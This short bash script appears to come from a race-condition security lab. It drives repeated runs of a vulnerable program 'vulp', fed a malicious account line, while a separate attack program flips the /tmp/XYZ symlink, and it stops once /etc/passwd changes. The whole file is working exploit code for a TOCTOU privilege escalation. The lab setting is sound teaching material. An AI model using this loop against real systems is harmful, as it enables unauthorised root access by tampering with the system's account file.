#!/bin/bash
#
# target_process.sh  -  driver for Task 2B and Task 2C.
#
# Because a single run of vulp almost never wins the race, we run it over and
# over in a tight loop until /etc/passwd actually changes. The attack program
# (attack_unlink_symlink or attack_renameat2) runs at the same time in another
# terminal, continuously flipping /tmp/XYZ. The moment vulp wins the race, the
# size/timestamp of /etc/passwd changes and the loop stops.
#
# vulp reads the new account line from standard input (see passwd_input).

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]
do
	./vulp < passwd_input          # feed the malicious /etc/passwd line
	new=$($CHECK_FILE)
done

echo "STOP... The /etc/passwd file has been changed"
